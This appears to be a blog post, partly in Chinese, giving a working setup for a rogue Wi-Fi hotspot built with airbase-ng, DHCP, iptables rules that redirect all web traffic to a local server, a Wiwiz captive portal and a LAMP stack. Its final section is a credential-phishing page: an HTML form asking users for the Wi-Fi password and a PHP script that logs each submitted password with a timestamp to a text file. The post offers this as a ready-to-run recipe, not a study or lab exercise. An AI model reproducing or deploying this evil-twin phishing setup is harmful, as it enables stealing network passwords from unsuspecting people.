---
layout: post
title: "airbase ng+dhcp+lamp+wiwiz"
description: ""
category: 
tags: []
---
{% include JB/setup %}

## Make wifi as a hot point
 
#### Make a script

	echo $0 $1
	case $1 in
	     "start")
	       sleep 1
	       ifconfig wlan0 down
	       sleep 1
	       iwconfig wlan0 mode monitor
	       sleep 1
	       ifconfig wlan0 up
	       sleep 2
	       airmon-ng start wlan0
	       sleep 1
	       airbase-ng -e 888888 -c 11 wlan0
	       sleep 1
	    ;;
	    "atup")
	       sleep 1
	       ifconfig at0 192.168.2.1 netmask 255.255.255.0
	       sleep 1
	       ifconfig at0 up
	       sleep 1
	       route add -net 192.168.2.0 netmask 255.255.255.0 gw 192.168.2.1
	       sleep 1
	#       echo "1" >/proc/sys/net/ipv4/ip_forward
	       sysctl -w net.ipv4.ip_forward=1
	       sleep 2
	       dhcpd -cf /etc/dhcp/dhcpd.conf -pf /var/run/dhcpd.pid at0
	       sleep 2
	       service isc-dhcp-server restart
	       sleep 1
	    ;;
	    "startnat")
	       sleep 1
	       iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE
	       sleep 1
	       iptables -A FORWARD -i wlan0 -o eth0 -j ACCEPT
	       sleep 1
	       iptables -A FORWARD -p tcp --syn -s 192.168.2.0/24 -j TCPMSS --set-mss 1356
	       iptables -t nat -A PREROUTING -p tcp -m multiport --dport 80,8080 -j DNAT --to 192.168.2.1:80
	    ;;
	    *)
	       echo "usage $0 {start|atup|startnat}"
	    ;;
	esac

#### Start wifi as a hot point
	sudo ./cr_wifi start
	sudo ./cr_wifi atup

## Deploy wiwiz
	sudo cd /
	sudo wget http://dl.wiwiz.com/hsbuilder-util-latest.tar.gz
	sudo tar -zxf hsbuilder-util-latest.tar.gz
	sudo /usr/local/hsbuilder/hsbuilder_setup.sh setup

	然后根据各步提示完成设置。以下是各步提示的说明：	
	“please select External NIC (typically the one going out to the Inernet):”– 此步请选择接入到Internet的网络接口。	
	“please select Internal NIC (typically your wifi interface):”– 此步请选择接入到局域网/无线局域网的网络接口。	
	“please input Hotspot ID:” — 此步请输入你在Wiwiz Web面板中创建的热点的Hotspot ID（不是热点的名称，也不是你的无线网络的SSID）。	
	“please input User Name:” — 此步请输入你的Wiwiz注册用户名。	
	“please input Server Address and Port:” — 此步请保持默认值。	
	“Do you want DHCP service to be configured? If you select No to skip it, you need to configure DHCP service manually later.” — 此步请选择是否让Wiwiz HotSpot Builder Utility自动配置DHCP服务。如果选择是，请继续以下的步骤。	
	“DHCP Setting: please input Network IP:” — 此步请输入你的局域网/无线局域网的网络IP。例如：192.168.1.0代表的是192.168.1.xxx网段。	
	“DHCP Setting: please input NET MASK:” — 此步请输入你的局域网/无线局域网的掩码。	
	“DHCP Setting: please input IP of Gateway (it should be the IP of this machine):” — 此步请输入今后的局域网/无线局域网的网关地址，即这台计算机的Internal NIC的IP地址（一般保留默认值即可）。	
	“DHCP Setting: please input DNS:” — 此步请输入DNS地址。默认值为程序自动检测到的DNS地址。也可以指定其他可用的DNS地址，推荐指定ISP提供的DNS地址。	
	“DHCP Setting: please input IP Range of this Network:” — 此步请输入DHCP地址分配范围。一般保留默认值即可。	
	最后，如果没有报错信息并看到“HSBuilder Setup Completed!”的提示文字，那么安装已经完成了。

## Deploy LAMP

### Install LAMP
	sudo wget http://dl.cnezsoft.com/zentao/8.0.1/ZenTaoPMS.8.0.1.zbox_32.tar.gz
	sudo tar zxvf  ZenTaoPMS.7.3.stable.zbox_32.tar.gz  -C /opt/

	1、执行/opt/zbox/zbox start 命令开启Apache和Mysql。
	   执行/opt/zbox/zbox stop 命令停止Apache和Mysql。
	   执行/opt/zbox/zbox restart 命令重启Apache和Mysql。
	   可以使用/opt/zbox/zbox -h命令来获取关于zbox命令的帮助
	   其中 -ap参数 可以修改Apache的端口，-mp参数 可以修改Mysql的端口
	2、浏览器访问 http://ip:端口
	3、数据库的用户名：root，密码为空。数据库管理用的是adminer，但是为了安全，访问adminer的时候需要身份验证，需要运行/opt/zbox/auth/adduser.sh来添加用户(先 cd /opt/zbox/auth/ 然后执行 ./adduser.sh)。
	3、网页访问禅道，点击数据库管理有2层验证：
	1）弹窗验证是输入运行 addusers.sh添加的帐号和密码；
	2）网页直接显示登录界面：服务器：127.0.0.1:mysql端口  帐号 root  数据库填写zentao

### Put an authorize page

Add a post

	<form action="reconnect.php" method="post">
        WIFI密码: &nbsp;&nbsp;
        <input type="password" name="wfphshr-wpa-password">
        <input id="btnSubmit" type="submit" value="提交">
    </form>

Add a action

	<?php
	date_default_timezone_set("Asia/Hong_Kong");
	$datetime = strtotime(date("Y-m-d H:i:s"));
	$myfile = fopen("./upload/passwd.txt", "ab") or die("Unable to open file!");
	$txt = $_POST["wfphshr-wpa-password"];
	fwrite($myfile, date("Y-m-d H:i:s"));
	fwrite($myfile, " ");
	fwrite($myfile, $txt);
	fwrite($myfile, "\r\n");
	fclose($myfile);
	?>

Put the page to /opt/zbox/app/htdocs

## Work together

Register a wiwiz account

Redirect the size to authorize page http://192.168.2.1